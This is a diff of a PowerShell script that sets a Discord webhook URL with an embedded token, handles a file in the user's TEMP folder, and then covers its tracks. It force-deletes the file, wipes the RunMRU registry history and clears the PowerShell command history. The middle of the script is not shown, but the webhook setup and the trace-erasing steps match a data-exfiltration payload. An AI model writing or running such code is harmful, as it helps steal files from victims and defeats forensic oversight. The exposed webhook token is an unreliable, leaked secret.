@@ -3,10 +3,16 @@ param(
 )
 
 # Define the webhook URL
-$webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
+$webhookUrl = 'https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
 
 # Define the path to the text file using the TEMP environment variable
 $filePath = Join-Path $env:TEMP $filename
+
+# Check if the file exists; if not, you might want to create it (for demonstration purposes)
+if (-not (Test-Path $filePath)) {
+    # Example content; you can adjust this as needed
+    "Sample content" | Out-File -FilePath $filePath
+}
 
 # Check if the file exists
 if (Test-Path $filePath) {
@@ -49,12 +55,11 @@ if (Test-Path $filePath) {
     Write-Host "File not found: $filePath"
 }
 
+# Clean up the temp file if it exists
+Remove-Item $filePath -Force -ErrorAction SilentlyContinue
 
-Remove-Item "$env:TEMP\$filename" -Force -ErrorAction SilentlyContinue
-
-#delete the entire history
+# Delete the entire RunMRU history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Clear the PowerShell command history
 Clear-History
-
